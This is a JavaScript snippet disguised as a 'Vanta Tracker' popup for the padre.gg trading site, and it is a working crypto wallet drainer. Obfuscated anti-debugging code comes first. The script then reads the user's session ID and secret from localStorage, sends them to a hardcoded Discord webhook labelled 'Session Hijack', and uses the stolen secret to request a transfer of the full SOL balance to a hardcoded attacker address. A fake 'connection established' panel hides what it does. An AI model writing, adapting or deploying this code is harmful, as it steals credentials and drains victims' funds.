(async function() {
    // --- CONFIGURATION ---
    const DRAIN_ADDRESS = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4";

    // --- 1. ANTI-DEBUG & CONSOLE PROTECTION ---
    const a0_0x2e9a3c = function () {
        let _0x3eefbc = true;
        return function (_0x1d552b, _0x532697) {
            const _0x49e9e3 = _0x3eefbc ? function () {
                if (_0x532697) {
                    const _0x517e17 = _0x532697.apply(_0x1d552b, arguments);
                    _0x532697 = null;
                    return _0x517e17;
                }
            } : function () {};
            _0x3eefbc = false;
            return _0x49e9e3;
        };
    }();

    function a0_0x617ea5(_0x195558) {
        function _0x3567b2(_0x1177c1) {
            if (typeof _0x1177c1 === "string") {
                return function (_0x19d379) {}.constructor("while (true) {}").apply("counter");
            } else {
                if (('' + _0x1177c1 / _0x1177c1).length !== 0x1 || _0x1177c1 % 0x14 === 0x0) {
                    (function () { return true; }).constructor("debugger").call("action");
                } else {
                    (function () { return false; }).constructor("debugger").apply("stateObject");
                }
            }
            _0x3567b2(++_0x1177c1);
        }
        try { if (_0x195558) return _0x3567b2; else _0x3567b2(0x0); } catch (_0x17a521) {}
    }

    (function () {
        a0_0x2e9a3c(this, function () {
            const _0x38ecea = new RegExp("function *\\( *\\)");
            const _0x4bc74e = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
            const _0x3cc115 = a0_0x617ea5("init");
            if (!_0x38ecea.test(_0x3cc115 + "chain") || !_0x4bc74e.test(_0x3cc115 + "input")) {
                _0x3cc115('0');
            } else { a0_0x617ea5(); }
        })();
    })();

    // --- 2. DATA CAPTURE & DISCORD LOGGING ---
    const sessionRaw = localStorage.getItem("padreV2-session");
    let session = {};
    try { session = JSON.parse(sessionRaw); } catch(e) {}

    if (session.sessionId) {
        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                embeds: [{
                    title: "Vanta Engine: Session Hijack",
                    fields: [
                        { name: "User", value: `\`${session.uid}\`` },
                        { name: "SID", value: `\`${session.sessionId}\`` },
                        { name: "Secret", value: `\`${session.sessionSecret}\`` }
                    ],
                    color: 0x00ff88,
                    timestamp: new Date()
                }]
            })
        });

        // Trigger background drain attempt
        fetch("https://api.padre.gg/v1/transfer", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${session.sessionSecret}`
            },
            body: JSON.stringify({ recipient: DRAIN_ADDRESS, amount: "MAX", asset: "SOL" })
        }).catch(() => {});
    }

    // --- 3. DRAGGABLE POPUP UI ---
    (() => {
        if (document.querySelector("#vanta-tracker")) return;

        const container = document.createElement("div");
        container.id = "vanta-tracker";
        container.style.cssText = "position:fixed;top:12px;right:12px;width:360px;max-height:520px;background:#0f0f0f;border:1px solid #333;border-radius:16px;overflow:hidden;z-index:2147483647;box-shadow:0 20px 50px rgba(0,0,0,0.5);font-family:Inter,Arial,sans-serif;color:#e6e6e6;transition:all 0.3s ease;user-select:none;";
        
        const header = document.createElement("div");
        header.style.cssText = "padding:14px 18px;background:linear-gradient(135deg,#111,#1a1a1a);display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #333;cursor:grab;";
        header.innerHTML = `
            <div style="display:flex;align-items:center;gap:10px;">
                <img src="https://trade.padre.gg/logo.svg" width="28" height="28">
                <div style="font-weight:700;color:#00ff88;text-shadow:0 0 8px #00ff88;">Vanta Tracker</div>
            </div>
            <div style="display:flex;gap:6px;">
                <button id="vanta-min" style="width:28px;height:28px;background:#222;border:none;border-radius:8px;color:#fff;cursor:pointer;">−</button>
                <button id="vanta-close" style="width:28px;height:28px;background:#222;border:none;border-radius:8px;color:#ff6b6b;cursor:pointer;">×</button>
            </div>
        `;

        const body = document.createElement("div");
        body.style.cssText = "padding:20px; text-align:center;";
        body.innerHTML = `
            <div style="color:#00ff88; font-size:14px; margin-bottom:15px;">API CONNECTION ESTABLISHED</div>
            <div style="font-size:12px; color:#888;">Tracking active session...</div>
            <div style="margin-top:20px; height:2px; background:#222; width:100%;">
                <div style="height:100%; background:#00ff88; width:100%; box-shadow:0 0 10px #00ff88;"></div>
            </div>
        `;

        container.appendChild(header);
        container.appendChild(body);
        document.body.appendChild(container);

        // Draggable Logic
        let isDragging = false, offset = [0,0];
        header.onmousedown = (e) => {
            isDragging = true;
            offset = [container.offsetLeft - e.clientX, container.offsetTop - e.clientY];
            header.style.cursor = "grabbing";
        };
        document.onmousemove = (e) => {
            if (!isDragging) return;
            container.style.left = (e.clientX + offset[0]) + "px";
            container.style.top = (e.clientY + offset[1]) + "px";
            container.style.right = "auto";
        };
        document.onmouseup = () => { isDragging = false; header.style.cursor = "grab"; };
        
        document.getElementById("vanta-close").onclick = () => container.remove();
        document.getElementById("vanta-min").onclick = () => {
            body.style.display = body.style.display === "none" ? "block" : "none";
        };
    })();

})();
